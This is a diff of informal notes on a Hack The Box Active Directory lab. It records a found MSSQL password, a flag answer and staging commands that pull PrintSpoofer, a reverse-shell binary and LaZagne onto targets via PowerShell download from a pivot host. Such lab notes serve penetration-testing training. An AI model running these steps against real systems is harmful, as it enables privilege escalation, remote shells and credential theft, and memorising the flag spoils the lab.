@@ -60,12 +60,19 @@ Question 6 - Locate a configuration file containing an MSSQL connection string. 
 Output: User ID=netdb;Password=D@ta_bAse_adm1n!"
 
 
-Question 7 - Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
+Question 7 - Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host. - s3imp3rs0nate_cl@ssic
 
+i neeed to come back to thsi and write the steps out cause holy shit. 
 
+scp both these to htb-student@10.129.32.184 then from a new ssh htb-student sesseion run python3 -m http.server THEN -> 
+
+Invoke-WebRequest -URI http://172.16.7.240:8000/PrintSpoofer64.exe -OutFile .\PrintSpoofer.exe
+Invoke-WebRequest -URI http://172.16.7.240:8000/shell.exe -OutFile .\rshell.exe
 
 Question 8 - Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
+scp both these to htb-student@10.129.32.184 then from a new ssh htb-student sesseion run python3 -m http.server THEN ->
 
+Invoke-WebRequest -URI http://172.16.7.240:8000/LaZagne.exe -OutFile .\LaZagne.exe -> make suer we are loading this to 172.16.7.60 ? i think.. this is the SQL box? 
 
 
 Question 9 - Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
